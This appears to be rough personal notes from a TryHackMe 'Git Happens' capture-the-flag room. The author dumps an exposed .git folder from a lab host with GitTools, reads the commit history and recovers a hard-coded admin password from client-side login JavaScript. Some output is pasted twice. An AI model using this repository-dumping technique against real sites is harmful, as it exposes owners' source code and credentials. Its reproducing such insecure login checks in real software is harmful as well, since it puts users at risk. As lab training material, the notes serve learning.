<code>
nmap, gobuster

found .git folder and dashboard.html


┌──(duke㉿kali)-[~/Documents/THM_GitHappens]
└─$ git clone https://github.com/internetwache/GitTools.git/        
Cloning into 'GitTools'...
remote: Enumerating objects: 242, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 242 (delta 9), reused 27 (delta 7), pack-reused 209
Receiving objects: 100% (242/242), 56.46 KiB | 3.14 MiB/s, done.
Resolving deltas: 100% (88/88), done.
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_GitHappens]
└─$ ./GitTools/Dumper/gitdumper.sh http://10.10.231.42/.git/ clone
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating clone/.git/
[+] Downloaded: HEAD

git clone https://github.com/internetwache/GitTools.git/        
Cloning into 'GitTools'...
remote: Enumerating objects: 242, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 242 (delta 9), reused 27 (delta 7), pack-reused 209
Receiving objects: 100% (242/242), 56.46 KiB | 3.14 MiB/s, done.
Resolving deltas: 100% (88/88), done.

                                                                                                                                                                                                                                        
┌──(duke㉿kali)-[~/Documents/THM_GitHappens/clone/.git]
└─$ git log                                                 
commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -> master, tag: v1.0)
Author: Adam Bertrand <hydragyrum@gmail.com>
Date:   Thu Jul 23 22:22:16 2020 +0000

    Update .gitlab-ci.yml

commit 77aab78e2624ec9400f9ed3f43a6f0c942eeb82d
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Fri Jul 24 00:21:25 2020 +0200

    add gitlab-ci config to build docker file.

commit 2eb93ac3534155069a8ef59cb25b9c1971d5d199
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Fri Jul 24 00:08:38 2020 +0200

    setup dockerfile and setup defaults.

commit d6df4000639981d032f628af2b4d03b8eff31213
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:42:30 2020 +0200

    Make sure the css is standard-ish!

commit d954a99b96ff11c37a558a5d93ce52d0f3702a7d
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:41:12 2020 +0200

    re-obfuscating the code to be really secure!

commit bc8054d9d95854d278359a432b6d97c27e24061d
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:37:32 2020 +0200

    Security says obfuscation isn't enough.
    
    They want me to use something called 'SHA-512'

commit e56eaa8e29b589976f33d76bc58a0c4dfb9315b1
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:25:52 2020 +0200

    Obfuscated the source code.
    
    Hopefully security will be happy!

commit 395e087334d613d5e423cdf8f7be27196a360459
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:17:43 2020 +0200

    Made the login page, boss!

commit 2f423697bf81fe5956684f66fb6fc6596a1903cc
Author: Adam Bertrand <hydragyrum@gmail.com>
Date:   Mon Jul 20 20:46:28 2020 +0000

    Initial commit
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_GitHappens/clone/.git]
└─$ git show 395e087334d613d5e423cdf8f7be27196a360459
commit 395e087334d613d5e423cdf8f7be27196a360459
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:17:43 2020 +0200

    Made the login page, boss!

diff --git a/css/style.css b/css/style.css
new file mode 100644
index 0000000..48926fd
--- /dev/null
+++ b/css/style.css
@@ -0,0 +1,197 @@
+* {
+  -webkit-font-smoothing: antialiased;
+  text-rendering: optimizeLegibility;
+}
+
+html,
+body {
+  height: 100%;
+}
+
+body {
+  display: -webkit-box;
+  display: flex;
+  -webkit-box-align: center;
+  align-items: center;
+  -webkit-box-pack: center;
+  justify-content: center;

+    <script>
+      function login() {
+        let form = document.getElementById("login-form");
+        console.log(form.elements);
+        let username = form.elements["username"].value;
+        let password = form.elements["password"].value;
+        if (
+          username === "admin" &&
+          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
+        ) {
+          document.cookie = "login=1";
+          window.location.href = "/dashboard.html";


<h2> use DeObfuscator for javascript </h2>
  
async function login() {
  let formElement = document.getElementById('login-form');
  console.log(formElement.elements);

  let username = formElement.elements['username'].value;
  let password = await digest(formElement.elements['password'].value);

  if (username === 'admin' && password === 'f64cb3d84319a5106e6a7c7ca5f298a865c5bea0703a71fd51a1513ec9cb') {
    document.cookie = 'login=1';
    window.location.href = '/dashboard';
  } else {
    document.getElementById('login-status').innerHTML = 'Invalid username or password';
  }
}

async function digest(data) {
  const encoder = new TextEncoder();
  const message = encoder.encode(data + 'SaltySecret');
  const hashBuffer = await crypto.subtle.digest('SHA-512', message);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashString = hashArray.map(byte => byte.toString(16).padStart(2, '0')).join('');
  return hashString;
}

</code>
